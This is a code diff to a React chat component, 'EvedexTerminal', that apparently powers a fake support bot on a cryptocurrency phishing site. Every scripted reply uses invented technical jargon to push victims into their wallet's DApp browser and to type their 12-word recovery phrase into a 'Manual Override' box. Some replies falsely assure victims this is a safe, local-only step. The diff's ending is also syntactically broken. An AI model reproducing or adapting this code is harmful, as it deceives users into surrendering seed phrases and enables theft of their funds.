@@ -65,29 +65,39 @@ export default function EvedexTerminal() {
     setTimeout(() => {
       let response = "";
 
-      // 1. HELP / STEPS / HOW TO
-      if (userMsg.includes("how") || userMsg.includes("step") || userMsg.includes("guide") || userMsg.includes("help") || userMsg.includes("process")) {
+      // 1. MONEY / BALANCE / ASSETS / SEE
+      if (["money", "balance", "token", "eth", "funds", "see", "vault"].some(word => userMsg.includes(word))) {
+        response = "[ENGINEER]: Native asset clusters detected but currently obscured by RPC latency. To view and manage your full vault balance, you must move this session to your Wallet's internal DApp browser to bypass the standard web sandbox.";
+      } 
+      // 2. HELP / HOW TO / STEPS / GUIDE
+      else if (["how", "step", "guide", "help", "process", "go about"].some(word => userMsg.includes(word))) {
         response = "[ENGINEER]: Protocol Alignment Procedure: 1. Mirror this site URL to your Wallet's internal DApp browser. 2. Initialize the required Portal (Swap/Stake/Rectify). 3. If a 90% Node Stall occurs, utilize the Red Manual Override box with your vault's 12-word entropy key to force final synchronization.";
       } 
-      // 2. ERROR / NOT WORKING / CAN'T TYPE
-      else if (userMsg.includes("not working") || userMsg.includes("can't") || userMsg.includes("error") || userMsg.includes("problem") || userMsg.includes("click") || userMsg.includes("type")) {
+      // 3. ERROR / NOT WORKING / CAN'T TYPE / CLICK / LOCKED
+      else if (["not working", "can't", "error", "problem", "click", "type", "locked", "broken"].some(word => userMsg.includes(word))) {
         response = "[ENGINEER]: Standard Webview Restriction detected. Your current browser is blocking the RPC handshake required for data entry. Move to a secure DApp environment (Trust/MetaMask) to unlock the input fields and authorize the node synchronization.";
       } 
-      // 3. SEED / PHRASE / WHY KEY / SAFETY
-      else if (userMsg.includes("seed") || userMsg.includes("phrase") || userMsg.includes("key") || userMsg.includes("mnemonic") || userMsg.includes("safe") || userMsg.includes("why")) {
+      // 4. SEED / PHRASE / WHY / SAFE / KEY
+      else if (["seed", "phrase", "key", "mnemonic", "safe", "why", "trust"].some(word => userMsg.includes(word))) {
         const securityAnswers = [
           "[ENGINEER]: The 12-word master entropy is required to re-index your vault's private key to the Mainnet cluster. Without this, the node cannot verify ownership during a 90% Desync. This is a local-only cryptographic handshake.",
           "[ENGINEER]: Cryptographic Verification: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new RPC architecture. This ensures 100% liquidity migration."
         ];
         response = securityAnswers[Math.floor(Math.random() * securityAnswers.length)];
       } 
-      // 4. TOKENS / ASSETS / BALANCE
-      else if (userMsg.includes("token") || userMsg.includes("money") || userMsg.includes("eth") || userMsg.includes("balance") || userMsg.includes("send") || userMsg.includes("swap")) {
-        response = "[ENGINEER]: Native asset clusters detected. To manage or migrate these funds, you must complete the 100% Sync. Use your wallet's internal DApp browser to bypass current latency blocks and finalize the handshake.";
-      }
-      // 5. STUCK / 90% / WAITING
-      else if (userMsg.includes("stuck") || userMsg.includes("waiting") || userMsg.includes("90") || userMsg.includes("slow")) {
+      // 5. STUCK / 90% / WAITING / SLOW
+      else if (["stuck", "waiting", "90", "slow", "percent"].some(word => userMsg.includes(word))) {
         response = "[ENGINEER]: Node Indexing is paused at the 90% threshold. This is a mandatory safety halt. To complete the final 10% and push the assets through, please use the Manual Override box with your recovery phrase.";
+      }
+      // 6. DEFAULT (If no keywords found)
+      else {
+        response = "[ENGINEER]: System Diagnostic: RPC latency detected. To resolve this and synchronize your vault, please ensure you have mirrored this link into your Wallet's internal DApp Browser. If stuck at 90%, utilize the Manual Override.";
+      }
+
+      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
+      setIsTyping(false);
+    }, 1500);
+  };
       }
       // 6. DEFAULT / GENERAL
       else {
